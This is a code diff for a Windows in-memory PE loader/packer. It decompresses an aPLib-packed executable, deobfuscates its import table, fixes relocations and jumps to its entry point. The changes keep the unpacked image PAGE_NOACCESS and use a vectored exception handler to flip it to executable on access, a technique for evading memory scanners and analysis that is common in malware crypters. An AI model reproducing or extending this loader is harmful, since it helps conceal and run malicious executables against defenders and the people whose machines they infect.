@@ -8,7 +8,7 @@
 #include "aplib/lib/coff/aplib.h"
 #include <stdint.h>
 
-#define DBG
+//#define DBG
 
 #ifdef DBG
     #define dbgprintf printf
@@ -102,47 +102,47 @@ VOID DeobfuscateIAT( PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)
     return;
 }
 
+/*
+struct CTX {
+    PEXCEPTION_POINTERS exPtr;
+    DWORD thID;
+};
+DWORD WINAPI SetContext(LPVOID ctx) {
+
+    CTX* context = (CTX*) ctx;
+    HANDLE hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), false, context->thID);
+    SuspendThread(hThread);
+    BOOL tc = SetThreadContext(hThread, context->exPtr->ContextRecord);
+    ResumeThread(hThread);
+    return 0;
+}
+*/
+
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exPtr) {
-    char buf[123];
 
-
-    if (exPtr->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION) {
-        return EXCEPTION_CONTINUE_SEARCH;
-    }
-    else {
-        printf("EXCEPTION_ACCESS_VIOLATION\n");
-    }
-
-    wsprintf(buf, "    ExceptionAddress: %x  EIP %x\n", exPtr->ExceptionRecord->ExceptionAddress, exPtr->ContextRecord->Rip);
-    dbgprintf("RIP : %08X\n", exPtr->ContextRecord->Rip);
-
-
-    
-    // The instruction that caused the exception is 6 byte long (at least on
-    // 32 Bit Windows, compare with recover-from-access-violation.objdump).
-    // We increase the instruction pointer (EIP) by these 6 bytes so as
-    // to recover from the violation...
-    //
-
-    //
-    // ... and set the changed contect record into the current record
-    // which causes the thread to continue after the bad instruction:
-    //
     MEMORY_BASIC_INFORMATION memory;
-    if (!VirtualQuery((LPVOID)decompressCode, &memory, sizeof(MEMORY_BASIC_INFORMATION))) {
-        dbgprintf("[-] Error VirtualQuery\n");
-        return EXCEPTION_CONTINUE_SEARCH;
-    }
-    dbgprintf("memory.BaseAddress : %08X\n", memory.BaseAddress);
-    dbgprintf("memory.Protect : %08X\n", memory.Protect);
-    dbgprintf("memory.RegionSize : %08X\n", memory.RegionSize);
-    BOOL vp = VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_EXECUTE_READWRITE, &decompressCodeProt);
-    dbgprintf("vp : %X\n", vp);
-    DWORD err = GetLastError();
-    dbgprintf("err : %04X\n", err);
-    //SetThreadContext(GetCurrentThread(), exPtr->ContextRecord);
+    DWORD oldProt;
+    if (exPtr->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
 
-    return EXCEPTION_CONTINUE_EXECUTION;
+        dbgprintf("ACCESS VIOLATION RIP : %08X\n", exPtr->ContextRecord->Rip);
+
+        
+        if (!VirtualQuery((LPVOID)decompressCode, &memory, sizeof(MEMORY_BASIC_INFORMATION))) {
+            dbgprintf("[-] Error VirtualQuery\n");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        BOOL vp = VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_EXECUTE_READWRITE, &oldProt);
+        /*
+        CTX context;
+        context.exPtr = exPtr;
+        DWORD tId;
+        context.thID = GetCurrentThreadId();
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SetContext, &context, 0, &tId);
+        WaitForSingleObject(hThread, INFINITE);
+        */
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
 }
                             
 
@@ -155,6 +155,9 @@ bool PacientZeroDecompress(HANDLE hFile, DWORD size, DWORD offset) {
         return false;
     }
 
+    DWORD oldProt;
+    MEMORY_BASIC_INFORMATION memory;
+
     DWORD bytesRead = 0;
     if (!ReadFile(hFile, compressedCode, size, &bytesRead, NULL)) {
         dbgprintf("[-] Error reading compressedCode\n");
@@ -165,6 +168,12 @@ bool PacientZeroDecompress(HANDLE hFile, DWORD size, DWORD offset) {
 	unsigned depackedsize = aPsafe_get_orig_size(compressedCode);
     decompressCodeProt = PAGE_NOACCESS;
     decompressCode = (char*) VirtualAlloc(NULL, depackedsize, MEM_COMMIT | MEM_RESERVE, decompressCodeProt);
+
+    if (!VirtualQuery((LPVOID)decompressCode, &memory, sizeof(MEMORY_BASIC_INFORMATION))) {
+        dbgprintf("[-] Error VirtualQuery\n");
+        return false;
+    }
+
     AddVectoredExceptionHandler(1, ExceptionHandler  );
     if (decompress(compressedCode, decompressCode, depackedsize, size) != 0) {
         dbgprintf("[-] Error decompress code\n");
@@ -172,14 +181,17 @@ bool PacientZeroDecompress(HANDLE hFile, DWORD size, DWORD offset) {
         return false;
     }
 
+    VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_NOACCESS, &oldProt);
     dbgprintf("[*] Before DeobfuscateIAT\n");
-    //DeobfuscateIAT((IMAGE_DOS_HEADER*)decompressCode, (IMAGE_NT_HEADERS*) (decompressCode + reinterpret_cast<IMAGE_DOS_HEADER*>(decompressCode)->e_lfanew));
+    DeobfuscateIAT((IMAGE_DOS_HEADER*)decompressCode, (IMAGE_NT_HEADERS*) (decompressCode + reinterpret_cast<IMAGE_DOS_HEADER*>(decompressCode)->e_lfanew));
     dbgprintf("[*] DeobfuscateIAT\n");
 
 
     IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*) (decompressCode + reinterpret_cast<IMAGE_DOS_HEADER*>(decompressCode)->e_lfanew);
 
     dbgprintf("[*] Before FixImageIAT\n");
+
+    VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_NOACCESS, &oldProt);
     FixImageIAT((IMAGE_DOS_HEADER*) decompressCode, nt_header);
     dbgprintf("[*] FixImageIAT\n");
 
@@ -187,10 +199,13 @@ bool PacientZeroDecompress(HANDLE hFile, DWORD size, DWORD offset) {
         ptrdiff_t difference = (ptrdiff_t) ((BYTE*) decompressCode - (BYTE*) nt_header->OptionalHeader.ImageBase);
         if (difference) {
             dbgprintf("[*] Before FixImageReloc\n");
+
+            VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_NOACCESS, &oldProt);
             FixImageRelocations((IMAGE_DOS_HEADER*) decompressCode, nt_header, difference);
             dbgprintf("[*] FixImageReloc\n");
         }
     }
+    VirtualProtect(memory.BaseAddress, memory.RegionSize, PAGE_NOACCESS, &oldProt);
 
     LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)decompressCode);
     ((void(*)())(oep))();
